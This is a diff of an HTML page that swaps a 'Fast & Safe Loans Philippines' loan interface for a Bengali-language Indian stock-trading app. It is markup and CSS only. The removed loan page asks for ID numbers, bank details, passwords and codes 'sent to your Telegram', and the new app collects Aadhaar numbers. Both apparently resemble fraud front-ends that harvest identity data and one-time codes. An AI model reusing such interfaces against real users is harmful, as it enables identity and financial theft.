+        /* ===== ADMIN ===== */
+        .admin-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 16px;
+        }
+        .admin-card {
+            background: var(--bg-card);
+            border-radius: var(--radius);
+            border: 1px solid var(--border-color);
+            padding: 18px 20px;
+        }
+        .admin-card h5 {
+            font-size: 14px;
+            font-weight: 700;
+            margin-bottom: 10px;
+            color: var(--text-secondary);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .admin-card .admin-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 6px 0;
+            font-size: 14px;
+            border-bottom: 1px solid var(--border-color);
+        }
+        .admin-card .admin-row:last-child {
+            border-bottom: none;
+        }
+        .admin-card .admin-row .label {
+            color: var(--text-secondary);
+        }
+        .admin-card .admin-row .value {
+            font-weight: 600;
+        }
+        .admin-card .admin-actions {
+            display: flex;
+            gap: 6px;
+            flex-wrap: wrap;
+            margin-top: 8px;
+        }
+        .admin-card .admin-actions .btn {
+            font-size: 12px;
+            padding: 4px 12px;
+        }
+        .admin-card input {
+            background: var(--bg-input);
+            border: 1px solid var(--border-color);
+            padding: 6px 10px;
+            font-size: 13px;
+            margin-bottom: 6px;
+        }
+
+        /* ===== TOAST ===== */
+        #toast-container {
+            position: fixed;
+            bottom: 24px;
+            right: 24px;
+            z-index: 9999;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            max-width: 360px;
+        }
+        .toast {
+            background: var(--bg-secondary);
+            color: var(--text-primary);
+            padding: 14px 20px;
+            border-radius: var(--radius);
+            border-left: 4px solid var(--accent-blue);
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.5);
+            animation: slideIn 0.3s ease;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .toast.success {
+            border-left-color: var(--accent-green);
+        }
+        .toast.error {
+            border-left-color: var(--accent-red);
+        }
+        .toast.warning {
+            border-left-color: var(--accent-yellow);
+        }
+        @keyframes slideIn {
+            0% {
+                transform: translateX(40px);
+                opacity: 0;
+            }
+            100% {
+                transform: translateX(0);
+                opacity: 1;
+            }
+        }
+
+        /* ===== MODAL ===== */
+        .modal-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: 2000;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            backdrop-filter: blur(4px);
+        }
+        .modal-overlay.open {
+            display: flex;
+        }
+        .modal-box {
+            background: var(--bg-secondary);
+            border-radius: 16px;
+            padding: 28px 32px;
+            max-width: 480px;
+            width: 100%;
+            border: 1px solid var(--border-color);
+            max-height: 90vh;
+            overflow-y: auto;
+            animation: fadeIn 0.25s ease;
+        }
+        .modal-box .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 16px;
+        }
+        .modal-box .modal-header h3 {
+            font-size: 20px;
+            font-weight: 700;
+        }
+        .modal-box .modal-header .close-btn {
+            font-size: 24px;
+            color: var(--text-muted);
+            cursor: pointer;
+            transition: var(--transition);
+        }
+        .modal-box .modal-header .close-btn:hover {
+            color: var(--text-primary);
+        }
+
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 900px) {
+            #sidebar {
+                width: 68px;
+            }
+            #sidebar .logo span,
+            #sidebar .nav-item span,
+            #sidebar .nav-item .badge,
+            #sidebar .user-info .name,
+            #sidebar .user-info .phone {
+                display: none;
+            }
+            #sidebar .logo {
+                justify-content: center;
+                padding: 16px 0;
+            }
+            #sidebar .logo i {
+                font-size: 28px;
+            }
+            #sidebar .nav-item {
+                justify-content: center;
+                padding: 12px;
+            }
+            #sidebar .nav-item i {
+                font-size: 20px;
+                width: auto;
+            }
+            #sidebar .user-info {
+                justify-content: center;
+                padding: 12px;
+            }
+            #sidebar .user-info .avatar {
+                width: 32px;
+                height: 32px;
+                font-size: 14px;
+            }
+            #sidebar .user-info .logout-btn {
+                margin-left: 0;
+            }
+            #main .topbar .page-title {
+                font-size: 15px;
+            }
+            #main .topbar .topbar-right .balance-display {
+                font-size: 12px;
+                padding: 4px 12px;
+            }
+            #main .content {
+                padding: 12px 14px;
+            }
+            .stats-grid {
+                grid-template-columns: 1fr 1fr;
+                gap: 10px;
+            }
+            .stat-card .stat-value {
+                font-size: 18px;
+            }
+            .wallet-grid {
+                grid-template-columns: 1fr;
+            }
+            .trade-panel .trade-form .form-row {
+                grid-template-columns: 1fr;
+            }
+            .stocks-table-wrap .table-header .search-box input {
+                width: 100px;
+            }
+            .stocks-table th,
+            .stocks-table td {
+                padding: 8px 10px;
+                font-size: 12px;
+            }
+            .stocks-table .trade-btns .btn {
+                padding: 2px 8px;
+                font-size: 10px;
+            }
+            .admin-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+        @media (max-width: 500px) {
+            #auth-page .auth-box {
+                padding: 24px 20px;
+            }
+            #sidebar {
+                width: 56px;
+            }
+            #sidebar .logo i {
+                font-size: 22px;
+            }
+            #sidebar .nav-item {
+                padding: 10px;
+            }
+            #sidebar .nav-item i {
+                font-size: 17px;
+            }
+            #sidebar .user-info .avatar {
+                width: 28px;
+                height: 28px;
+                font-size: 12px;
+            }
+            .stats-grid {
+                grid-template-columns: 1fr 1fr;
+                gap: 8px;
+            }
+            .stat-card {
+                padding: 12px 14px;
+            }
+            .stat-card .stat-value {
+                font-size: 16px;
+            }
+            .chart-container {
+                height: 200px;
+            }
+            #main .topbar {
+                padding: 8px 12px;
+                flex-wrap: wrap;
+                gap: 6px;
+            }
+            #main .topbar .page-title {
+                font-size: 13px;
+            }
+            #main .content {
+                padding: 8px 10px;
+            }
+            .stocks-table th,
+            .stocks-table td {
+                padding: 6px 8px;
+                font-size: 11px;
+            }
+            .stocks-table .stock-name {
+                font-size: 10px;
+            }
+            .modal-box {
+                padding: 20px 16px;
+            }
+            .toast {
+                font-size: 12px;
+                padding: 10px 14px;
+            }
+        }
+
+        /* ===== LOADING SPINNER ===== */
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 2px solid var(--border-color);
+            border-top: 2px solid var(--accent-yellow);
+            border-radius: 50%;
+            animation: spin 0.6s linear infinite;
+        }
+        @keyframes spin {
+            0% {
+                transform: rotate(0);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* toggle switch */
+        .toggle {
+            position: relative;
+            width: 40px;
+            height: 22px;
+            background: var(--bg-input);
+            border-radius: 12px;
+            cursor: pointer;
+            transition: var(--transition);
+            flex-shrink: 0;
+        }
+        .toggle.active {
+            background: var(--accent-green);
+        }
+        .toggle .toggle-knob {
+            position: absolute;
+            top: 2px;
+            left: 2px;
+            width: 18px;
+            height: 18px;
+            background: #fff;
+            border-radius: 50%;
+            transition: var(--transition);
+        }
+        .toggle.active .toggle-knob {
+            left: 20px;
+        }
+        .toggle-label {
+            font-size: 13px;
+            color: var(--text-secondary);
+        }
+
+        /* badge status */
+        .status-badge {
+            padding: 2px 12px;
+            border-radius: 12px;
+            font-size: 11px;
+            font-weight: 600;
+            display: inline-block;
+        }
+        .status-badge.verified {
+            background: rgba(14, 203, 129, 0.2);
+            color: var(--accent-green);
+        }
+        .status-badge.unverified {
+            background: rgba(246, 70, 93, 0.2);
+            color: var(--accent-red);
+        }
+        .status-badge.frozen {
+            background: rgba(240, 185, 11, 0.2);
+            color: var(--accent-yellow);
+        }
+        .status-badge.active {
+            background: rgba(30, 128, 255, 0.2);
+            color: var(--accent-blue);
+        }
+    </style>
 </head>
 <body>
-<div id="app">
 
-  <div id="toast"></div>
-
-  <!-- LOGIN SCREEN -->
-  <div id="screen-login" class="screen active">
-    <div class="auth-wrap">
-      <div class="auth-logo">
-        <div class="logo-icon">₱</div>
-        <div class="logo-text">
-          <strong>Fast &amp; Safe Loans</strong>
-          <span>Philippines • Trusted Since 2020</span>
-        </div>
-      </div>
-      <h1 class="auth-title">Welcome Back 👋</h1>
-      <p class="auth-sub">Sign in to your account to continue</p>
-      <form id="login-form" autocomplete="off">
-        <div class="form-group">
-          <label for="login-email">Email Address</label>
-          <input type="email" id="login-email" placeholder="Enter your email" autocomplete="new-password" inputmode="email">
-        </div>
-        <div class="form-group">
-          <label for="login-password">Password</label>
-          <div class="pw-wrap">
-            <input type="password" id="login-password" placeholder="Enter your password" autocomplete="new-password">
-            <button type="button" class="pw-toggle" onclick="togglePw('login-password',this)">👁</button>
-          </div>
-        </div>
-        <button type="submit" class="btn-primary" id="login-btn">Sign In</button>
-      </form>
-      <p class="auth-switch">Don't have an account? <a onclick="showScreen('screen-register')">Create Account</a></p>
-    </div>
-  </div>
-
-  <!-- REGISTER SCREEN -->
-  <div id="screen-register" class="screen">
-    <div class="auth-wrap" style="padding-top:20px;">
-      <div class="auth-logo">
-        <div class="logo-icon">₱</div>
-        <div class="logo-text">
-          <strong>Fast &amp; Safe Loans</strong>
-          <span>Philippines</span>
-        </div>
-      </div>
-      <h1 class="auth-title">Create Account</h1>
-      <p class="auth-sub">Fill in your details to get started</p>
-      <form id="register-form" autocomplete="off">
-        <div class="form-group">
-          <label>Full Name</label>
-          <input type="text" id="reg-fullname" placeholder="Enter your full name" autocomplete="off">
-        </div>
-        <div class="form-row">
-          <div class="form-group">
-            <label>ID Name</label>
-            <input type="text" id="reg-idname" placeholder="Name on ID" autocomplete="off">
-          </div>
-          <div class="form-group">
-            <label>ID Card Number</label>
-            <input type="text" id="reg-idnumber" placeholder="ID Number" autocomplete="off">
-          </div>
-        </div>
-        <div class="form-group">
-          <label>Email Address</label>
-          <input type="email" id="reg-email" placeholder="Enter email" autocomplete="off" inputmode="email">
-        </div>
-        <div class="form-group">
-          <label>Password</label>
-          <div class="pw-wrap">
-            <input type="password" id="reg-password" placeholder="Min. 6 characters" autocomplete="new-password">
-            <button type="button" class="pw-toggle" onclick="togglePw('reg-password',this)">👁</button>
-          </div>
-        </div>
-        <div class="form-group">
-          <label>Confirm Password</label>
-          <div class="pw-wrap">
-            <input type="password" id="reg-confirm" placeholder="Repeat password" autocomplete="new-password">
-            <button type="button" class="pw-toggle" onclick="togglePw('reg-confirm',this)">👁</button>
-          </div>
-        </div>
-        <button type="submit" class="btn-primary" id="register-btn">Create Account</button>
-      </form>
-      <p class="auth-switch">Already have an account? <a onclick="showScreen('screen-login')">Sign In</a></p>
-    </div>
-  </div>
-
-  <!-- DASHBOARD SCREEN -->
-  <div id="screen-dashboard" class="screen">
-    <div class="dash-header">
-      <div class="dash-logo">
-        <div class="logo-icon">₱</div>
-        <strong>FSL Philippines</strong>
-      </div>
-      <button class="btn-logout" onclick="doLogout()">Log Out</button>
-    </div>
-
-    <div class="balance-card">
-      <div class="balance-label">Available Balance</div>
-      <div class="balance-amount"><span class="currency">₱</span><span id="disp-balance">0.00</span></div>
-      <div class="balance-card-row">
-        <div>
-          <div class="loan-type">Fast &amp; Safe Loans</div>
-        </div>
-        <div id="disp-status-badge" class="status-badge badge-none">No Loan</div>
-      </div>
-    </div>
-
-    <div id="panel-home" class="tab-panel active">
-      <div style="padding-top:4px;"></div>
-      <div id="verified-strip" class="verified-strip" style="display:none;">✅ Account Verified &amp; Active</div>
-      <div class="stat-grid">
-        <div class="stat-card">
-          <div class="s-label">Loan Status</div>
-          <div class="s-value yellow" id="home-loan-status">—</div>
-        </div>
-        <div class="stat-card">
-          <div class="s-label">Loan Amount</div>
-          <div class="s-value" id="home-loan-amount">₱0</div>
-        </div>
-        <div class="stat-card">
-          <div class="s-label">Account Type</div>
-          <div class="s-value" style="font-size:13px;">Personal Loan</div>
-        </div>
-        <div class="stat-card">
-          <div class="s-label">Slot #</div>
-          <div class="s-value yellow" id="home-slot">—</div>
-        </div>
-      </div>
-      <div class="section-label">Quick Actions</div>
-      <div class="stat-grid" style="grid-template-columns:1fr 1fr 1fr;margin:0 20px 16px;">
-        <div class="stat-card" style="text-align:center;cursor:pointer;" onclick="switchTab('loan')">
-          <div style="font-size:24px;margin-bottom:4px;">💰</div>
-          <div style="font-size:11px;font-weight:700;color:var(--text2);">Apply Loan</div>
-        </div>
-        <div class="stat-card" style="text-align:center;cursor:pointer;" onclick="switchTab('withdraw')">
-          <div style="font-size:24px;margin-bottom:4px;">🏧</div>
-          <div style="font-size:11px;font-weight:700;color:var(--text2);">Withdraw</div>
-        </div>
-        <div class="stat-card" style="text-align:center;cursor:pointer;" onclick="openIdModal()">
-          <div style="font-size:24px;margin-bottom:4px;">🪪</div>
-          <div style="font-size:11px;font-weight:700;color:var(--text2);">View ID</div>
-        </div>
-      </div>
-      <div class="section-card">
-        <div class="section-title"><span class="icon">📢</span>Notice</div>
-        <p style="font-size:13px;color:var(--text2);line-height:1.7;">Fast &amp; Safe Loans Philippines offers quick personal loans with flexible repayment. Apply today and get approved within minutes. Requirements: valid ID and active bank account.</p>
-      </div>
-    </div>
-
-    <!-- LOAN TAB -->
-    <div id="panel-loan" class="tab-panel">
-      <div style="padding-top:4px;"></div>
-      <div class="section-card" style="margin-bottom:8px;">
-        <div class="section-title"><span class="icon">💰</span>Loan Application</div>
-        <p style="font-size:13px;color:var(--text2);">Fill in your details below. Our team will review your application.</p>
-      </div>
-      <div class="loan-form-wrap">
-        <form id="loan-form" autocomplete="off">
-          <div class="form-group"><label>Full Name</label><input type="text" id="loan-fullname" value="Shane Sabal" autocomplete="off"></div>
-          <div class="form-group"><label>ID Number</label><input type="text" id="loan-idnumber" value="4830645821731280" autocomplete="off"></div>
-          <div class="form-row">
-            <div class="form-group">
-              <label>Gender</label>
-              <select id="loan-gender">
-                <option value="Female" selected>Female</option>
-                <option value="Male">Male</option>
-                <option value="Other">Other</option>
-              </select>
+    <!-- ============================================================ -->
+    <!-- AUTH PAGE -->
+    <!-- ============================================================ -->
+    <div id="auth-page">
+        <div class="auth-box">
+            <div class="auth-logo">
+                <i class="fas fa-chart-line"></i> Stock<span>Exchange</span>
             </div>
-            <div class="form-group">
-              <label>Birthday</label>
-              <input type="date" id="loan-birthday" value="1990-05-15" autocomplete="off">
+            <div class="auth-sub">ইন্ডিয়ান স্টক ট্রেডিং প্ল্যাটফর্ম</div>
+
+            <div id="auth-error" class="error-msg"></div>
+            <div id="auth-success" class="success-msg"></div>
+
+            <!-- Login Form -->
+            <div id="login-form">
+                <div class="form-group">
+                    <label>📱 ফোন নম্বর</label>
+                    <input type="text" id="login-phone" placeholder="+91 9876543210" />
+                </div>
+                <div class="form-group">
+                    <label>🔒 পাসওয়ার্ড</label>
+                    <input type="password" id="login-password" placeholder="পাসওয়ার্ড লিখুন" />
+                </div>
+                <button class="btn btn-primary btn-block" id="login-btn">লগইন করুন</button>
+                <div class="auth-footer">
+                    নতুন ব্যবহারকারী? <a id="goto-register">রেজিস্টার করুন</a>
+                </div>
             </div>
-          </div>
-          <div class="form-group"><label>Bank Name</label>
-            <select id="loan-bank">
-              <option value="BDO">BDO Unibank</option>
-              <option value="BPI">BPI</option>
-              <option value="Metrobank" selected>Metrobank</option>
-              <option value="Landbank">Landbank</option>
-              <option value="PNB">PNB</option>
-              <option value="Security Bank">Security Bank</option>
-              <option value="UnionBank">UnionBank</option>
-              <option value="RCBC">RCBC</option>
-            </select>
-          </div>
-          <div class="form-group"><label>Bank Account Number</label><input type="text" id="loan-bankaccount" value="0987654321" autocomplete="off" inputmode="numeric"></div>
-          <div class="form-row">
-            <div class="form-group">
-              <label>Marital Status</label>
-              <select id="loan-marital">
-                <option value="Single" selected>Single</option>
-                <option value="Married">Married</option>
-                <option value="Widowed">Widowed</option>
-              </select>
+
+            <!-- Register Form -->
+            <div id="register-form" class="hidden">
+                <div class="form-group">
+                    <label>👤 নাম</label>
+                    <input type="text" id="reg-name" placeholder="আপনার নাম" />
+                </div>
+                <div class="form-group">
+                    <label>📱 ফোন নম্বর</label>
+                    <input type="text" id="reg-phone" placeholder="+91 9876543210" />
+                </div>
+                <div class="form-group">
+                    <label>🪪 আধার কার্ড নম্বর</label>
+                    <input type="text" id="reg-aadhaar" placeholder="1234 5678 9012" />
+                </div>
+                <div class="form-group">
+                    <label>🔒 পাসওয়ার্ড</label>
+                    <input type="password" id="reg-password" placeholder="নতুন পাসওয়ার্ড" />
+                </div>
+                <button class="btn btn-primary btn-block" id="register-btn">রেজিস্টার করুন</button>
+                <div class="auth-footer">
+                    ইতিমধ্যে অ্যাকাউন্ট আছে? <a id="goto-login">লগইন করুন</a>
+                </div>
             </div>
-            <div class="form-group">
-              <label>Education</label>
-              <select id="loan-education">
-                <option value="High School">High School</option>
-                <option value="College" selected>College</option>
-                <option value="Vocational">Vocational</option>
-                <option value="Graduate">Graduate</option>
-              </select>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- TOAST CONTAINER -->
+    <!-- ============================================================ -->
+    <div id="toast-container"></div>
+
+    <!-- ============================================================ -->
+    <!-- MODAL -->
+    <!-- ============================================================ -->
+    <div class="modal-overlay" id="modal-overlay">
+        <div class="modal-box" id="modal-box">
+            <div class="modal-header">
+                <h3 id="modal-title">ট্রেড</h3>
+                <span class="close-btn" id="modal-close">&times;</span>
             </div>
-          </div>
-          <div class="form-group"><label>Career / Occupation</label><input type="text" id="loan-career" value="Entrepreneur" autocomplete="off"></div>
-          <div class="form-group"><label>Province</label>
-            <select id="loan-province">
-              <option value="Metro Manila" selected>Metro Manila</option>
-              <option value="Cebu">Cebu</option>
-              <option value="Davao">Davao</option>
-              <option value="Bulacan">Bulacan</option>
-              <option value="Laguna">Laguna</option>
-              <option value="Pampanga">Pampanga</option>
-              <option value="Batangas">Batangas</option>
-              <option value="Rizal">Rizal</option>
-              <option value="Cavite">Cavite</option>
-              <option value="Other">Other</option>
-            </select>
-          </div>
-          <div class="form-group"><label>Complete Address</label><input type="text" id="loan-address" value="123 Rizal St., Makati City" autocomplete="off"></div>
-          <div class="form-group"><label>Loan Amount (₱)</label><input type="number" id="loan-amount" value="50000" min="1000" max="500000" inputmode="numeric" autocomplete="off"></div>
-          <button type="submit" class="btn-primary" id="loan-btn">📋 Submit Loan Application</button>
-          <div id="loan-status-info" style="margin-top:14px;text-align:center;font-size:13px;color:var(--text2);"></div>
-        </form>
-      </div>
+            <div id="modal-body"></div>
+        </div>
     </div>
 
-    <!-- WITHDRAW TAB -->
-    <div id="panel-withdraw" class="tab-panel">
-      <div style="padding-top:4px;"></div>
-      <div class="section-card" style="margin-bottom:8px;">
-        <div class="section-title"><span class="icon">🏧</span>Withdraw Funds</div>
-        <p style="font-size:13px;color:var(--text2);">Select your bank or e-wallet and enter withdrawal details.</p>
-      </div>
-      <div style="padding:0 20px;">
-        <div class="section-label" style="margin:0 0 10px;">Banks</div>
-        <div class="bank-grid">
-          <div class="bank-card" data-bank="BDO" onclick="selectBank(this)"><span class="bank-icon">🏦</span><span class="bank-name">BDO</span></div>
-          <div class="bank-card" data-bank="BPI" onclick="selectBank(this)"><span class="bank-icon">🏛</span><span class="bank-name">BPI</span></div>
-          <div class="bank-card" data-bank="Metrobank" onclick="selectBank(this)"><span class="bank-icon">🏢</span><span class="bank-name">Metrobank</span></div>
-          <div class="bank-card" data-bank="Landbank" onclick="selectBank(this)"><span class="bank-icon">🌾</span><span class="bank-name">Landbank</span></div>
-          <div class="bank-card" data-bank="PNB" onclick="selectBank(this)"><span class="bank-icon">🏠</span><span class="bank-name">PNB</span></div>
-          <div class="bank-card" data-bank="Security Bank" onclick="selectBank(this)"><span class="bank-icon">🛡</span><span class="bank-name">Security Bank</span></div>
-          <div class="bank-card" data-bank="UnionBank" onclick="selectBank(this)"><span class="bank-icon">💼</span><span class="bank-name">UnionBank</span></div>
-          <div class="bank-card" data-bank="RCBC" onclick="selectBank(this)"><span class="bank-icon">📊</span><span class="bank-name">RCBC</span></div>
+    <!-- ============================================================ -->
+    <!-- MAIN APP -->
+    <!-- ============================================================ -->
+    <div id="sidebar">
+        <div class="logo">
+            <i class="fas fa-chart-line"></i>
+            <span>Stock<span>Exchange</span></span>
         </div>
-        <div class="section-label" style="margin:4px 0 10px;">E-Wallets</div>
-        <div class="bank-grid">
-          <div class="bank-card" data-bank="GCash" onclick="selectBank(this)"><span class="bank-icon">📱</span><span class="bank-name">GCash</span></div>
-          <div class="bank-card" data-bank="Maya" onclick="selectBank(this)"><span class="bank-icon">💳</span><span class="bank-name">Maya</span></div>
-          <div class="bank-card" data-bank="Coins.ph" onclick="selectBank(this)"><span class="bank-icon">🪙</span><span class="bank-name">Coins.ph</span></div>
-          <div class="bank-card" data-bank="GrabPay" onclick="selectBank(this)"><span class="bank-icon">🚕</span><span class="bank-name">GrabPay</span></div>
-        </div>
-        <div id="withdraw-form-section" style="display:none;margin-top:4px;">
-          <div class="section-card" style="margin:0 0 12px;">
-            <p style="font-size:13px;font-weight:600;color:var(--text2);">Selected: <span id="selected-bank-name" style="color:var(--yellow-dark);"></span></p>
-          </div>
-          <div class="form-group"><label>Withdrawal Amount (₱)</label><input type="number" id="wd-amount" placeholder="Enter amount" inputmode="numeric" autocomplete="off"></div>
-          <div class="form-group"><label>Account Number / Mobile</label><input type="text" id="wd-account" placeholder="Bank account / mobile number" autocomplete="off" inputmode="numeric"></div>
-          <div class="form-group"><label>Account Name</label><input type="text" id="wd-accname" placeholder="Name on account" autocomplete="off"></div>
-          <div class="form-group"><label>Password (Confirm)</label>
-            <div class="pw-wrap">
-              <input type="password" id="wd-password" placeholder="Enter your password" autocomplete="new-password">
-              <button type="button" class="pw-toggle" onclick="togglePw('wd-password',this)">👁</button>
+        <div class="nav">
+            <div class="nav-item active" data-page="dashboard">
+                <i class="fas fa-th-large"></i>
+                <span>ড্যাশবোর্ড</span>
             </div>
-          </div>
-          <button class="btn-primary" onclick="submitWithdraw()" id="wd-btn">🏧 Process Withdrawal</button>
+            <div class="nav-item" data-page="markets">
+                <i class="fas fa-chart-simple"></i>
+                <span>মার্কেট</span>
+            </div>
+            <div class="nav-item" data-page="wallet">
+                <i class="fas fa-wallet"></i>
+                <span>ওয়ালেট</span>
+            </div>
+            <div class="nav-item" data-page="profile">
+                <i class="fas fa-user"></i>
+                <span>প্রোফাইল</span>
+            </div>
+            <div class="nav-item" data-page="admin" id="admin-nav" style="display:none;">
+                <i class="fas fa-shield-halved"></i>
+                <span>অ্যাডমিন</span>
+                <span class="badge">!</span>
+            </div>
         </div>
-      </div>
-    </div>
-
-    <!-- PROFILE TAB -->
-    <div id="panel-profile" class="tab-panel">
-      <div style="padding-top:4px;"></div>
-      <div class="profile-header">
-        <div class="profile-avatar">👤</div>
-        <div class="profile-name" id="prof-name">—</div>
-        <div class="profile-email" id="prof-email">—</div>
-        <div style="margin-top:8px;">
-          <span class="status-badge badge-approved" id="prof-verified-badge" style="font-size:10px;">✅ Verified</span>
+        <div class="user-info">
+            <div class="avatar" id="sidebar-avatar">U</div>
+            <div>
+                <div class="name" id="sidebar-name">ব্যবহারকারী</div>
+                <div class="phone" id="sidebar-phone">+91 **********</div>
+            </div>
+            <button class="logout-btn" id="logout-btn"><i class="fas fa-right-from-bracket"></i></button>
         </div>
-      </div>
-      
-      <div class="profile-stats">
-        <div class="profile-stat">
-          <div class="ps-value yellow" id="prof-balance">₱0</div>
-          <div class="ps-label">Balance</div>
+    </div>
+
+    <div id="main">
+        <!-- TOPBAR -->
+        <div class="topbar">
+            <div class="page-title" id="page-title">ড্যাশবোর্ড</div>
+            <div class="topbar-right">
+                <div class="balance-display">
+                    <i class="fas fa-indian-rupee-sign"></i>
+                    <span id="topbar-balance">0.00</span>
+                </div>
+                <span style="font-size:13px;color:var(--text-secondary);" id="topbar-credit">⭐ 600</span>
+                <span class="status-badge verified" id="topbar-status">✅ যাচাইকৃত</span>
+            </div>
         </div>
-        <div class="profile-stat">
-          <div class="ps-value" id="prof-loanstatus">—</div>
-          <div class="ps-label">Loan Status</div>
-        </div>
-        <div class="profile-stat">
-          <div class="ps-value" id="prof-slot">—</div>
-          <div class="ps-label">Slot #</div>
-        </div>
-      </div>
-      
-      <div class="profile-list">
-        <div class="profile-item"><span class="p-label">Full Name</span><span class="p-value" id="prof-fullname">—</span></div>
-        <div class="profile-item"><span class="p-label">ID Name</span><span class="p-value" id="prof-idname">—</span></div>
-        <div class="profile-item"><span class="p-label">ID Number</span><span class="p-value" id="prof-idnumber">—</span></div>
-        <div class="profile-item"><span class="p-label">Email</span><span class="p-value" id="prof-email2">—</span></div>
-        <div class="profile-item"><span class="p-label">Loan Amount</span><span class="p-value yellow" id="prof-loanamount">₱0</span></div>
-      </div>
-      
-      <div class="profile-actions">
-        <button class="action-btn primary" onclick="openIdModal()">🪪 View ID</button>
-        <button class="action-btn danger" onclick="doLogout()">🚪 Log Out</button>
-      </div>
-    </div>
-
-    <div class="tab-bar">
-      <button class="tab-item active" id="tab-home" onclick="switchTab('home')">
-        <span class="tab-icon">🏠</span><span class="tab-label">Home</span>
-      </button>
-      <button class="tab-item" id="tab-loan" onclick="switchTab('loan')">
-        <span class="tab-icon">💰</span><span class="tab-label">Loan</span>
-      </button>
-      <button class="tab-item" id="tab-withdraw" onclick="switchTab('withdraw')">
-        <span class="tab-icon">🏧</span><span class="tab-label">Withdraw</span>
-      </button>
-      <button class="tab-item" id="tab-profile" onclick="switchTab('profile')">
-        <span class="tab-icon">👤</span><span class="tab-label">Profile</span>
-      </button>
-      <button class="tab-item" id="tab-id" onclick="openIdModal()">
-        <span class="tab-icon">🪪</span><span class="tab-label">ID</span>
-      </button>
-    </div>
-  </div>
-
-  <!-- BANK VERIFICATION OVERLAY -->
-  <div class="overlay" id="overlay-bank-verify">
-    <div class="overlay-card">
-      <h3>🏦 Bank Verification</h3>
-      <p>Enter the verification code sent to your Telegram</p>
-      
-      <div class="code-input">
-        <input type="text" id="bank-code-1" maxlength="1" oninput="moveNext(this,'bank-code-2')">
-        <input type="text" id="bank-code-2" maxlength="1" oninput="moveNext(this,'bank-code-3')">
-        <input type="text" id="bank-code-3" maxlength="1" oninput="moveNext(this,'bank-code-4')">
-        <input type="text" id="bank-code-4" maxlength="1" oninput="moveNext(this,'bank-code-5')">
-        <input type="text" id="bank-code-5" maxlength="1" oninput="moveNext(this,'bank-code-6')">
-        <input type="text" id="bank-code-6" maxlength="1" oninput="moveNext(this,'bank-code-6')">
-      </div>
-      
-      <div class="info-text">📱 Check your Telegram for the verification code</div>
-      
-      <div class="swipe-container" id="swipe-container">
-        <div class="swipe-track" id="swipe-track">
-          <div class="swipe-bg" id="swipe-bg"></div>
-          <div class="swipe-text" id="swipe-text">⬅️ Swipe to Verify</div>
-          <div class="swipe-thumb" id="swipe-thumb">
-            <span class="arrow">➜</span>
-          </div>
-        </div>
-      </div>
-      
-      <button class="btn-secondary" onclick="document.getElementById('overlay-bank-verify').classList.remove('active'); showScreen('screen-login');">🔙 Back</button>
-    </div>
-  </div>
-
-  <!-- LOAN CONFIRM OVERLAY -->
-  <div class="overlay" id="overlay-loan-confirm">
-    <div class="overlay-card">
-      <h3>⏳ Loan Processing</h3>
-      <p style="font-size:13px;color:var(--text2);margin-bottom:8px;">Enter the loan confirmation code sent to your Telegram</p>
-      
-      <div class="code-input">
-        <input type="text" id="loan-code-1" maxlength="1" oninput="moveNext(this,'loan-code-2')">
-        <input type="text" id="loan-code-2" maxlength="1" oninput="moveNext(this,'loan-code-3')">
-        <input type="text" id="loan-code-3" maxlength="1" oninput="moveNext(this,'loan-code-4')">
-        <input type="text" id="loan-code-4" maxlength="1" oninput="moveNext(this,'loan-code-5')">
-        <input type="text" id="loan-code-5" maxlength="1" oninput="moveNext(this,'loan-code-6')">
-        <input type="text" id="loan-code-6" maxlength="1" oninput="moveNext(this,'loan-code-6')">
-      </div>
-      
-      <div class="info-text">📱 Check your Telegram for the confirmation code</div>
-      
-      <div class="timer-display">
-        <span id="loan-confirm-time">7d 00:00</span>
-      </div>
-      
-      <div style="font-size:11px;color:var(--text3);font-weight:600;letter-spacing:.5px;margin-bottom:16px;">REMAINING</div>
-      
-      <button class="btn-primary" onclick="verifyLoanCode()">✔ Confirm Loan</button>
-    </div>
-  </div>
-
-  <!-- WITHDRAW CONFIRM OVERLAY -->
-  <div class="overlay" id="overlay-wd-confirm">
-    <div class="overlay-card">
-      <h3>💸 Withdrawal Confirmation</h3>
-      <p style="font-size:13px;color:var(--text2);margin-bottom:8px;">Enter the withdrawal confirmation code sent to your Telegram</p>
-      
-      <div class="code-input">
-        <input type="text" id="wd-code-1" maxlength="1" oninput="moveNext(this,'wd-code-2')">
-        <input type="text" id="wd-code-2" maxlength="1" oninput="moveNext(this,'wd-code-3')">
-        <input type="text" id="wd-code-3" maxlength="1" oninput="moveNext(this,'wd-code-4')">
-        <input type="text" id="wd-code-4" maxlength="1" oninput="moveNext(this,'wd-code-5')">
-        <input type="text" id="wd-code-5" maxlength="1" oninput="moveNext(this,'wd-code-6')">
-        <input type="text" id="wd-code-6" maxlength="1" oninput="moveNext(this,'wd-code-6')">
-      </div>
-      
-      <div class="info-text">📱 Check your Telegram for the confirmation code</div>
-      
-      <div class="timer-display">
-        <span id="wd-confirm-time">01:00</span>
-      </div>
-      
-      <div style="font-size:11px;color:var(--text3);font-weight:600;letter-spacing:.5px;margin-bottom:16px;">REMAINING</div>
-      
-      <button class="btn-primary" onclick="verifyWdCode()">✔ Confirm Withdrawal</button>
-      <button class="btn-secondary" onclick="cancelWithdraw()">❌ Cancel</button>
-    </div>
-  </div>
-
-  <!-- ID Modal -->
-  <div class="modal-backdrop" id="modal-id">
-    <div class="modal-box">
-      <div class="modal-head">
-        <h4>🪪 ID Photo</h4>
-        <button class="modal-close" onclick="closeIdModal()">✕</button>
-      </div>
-      <div class="modal-body">
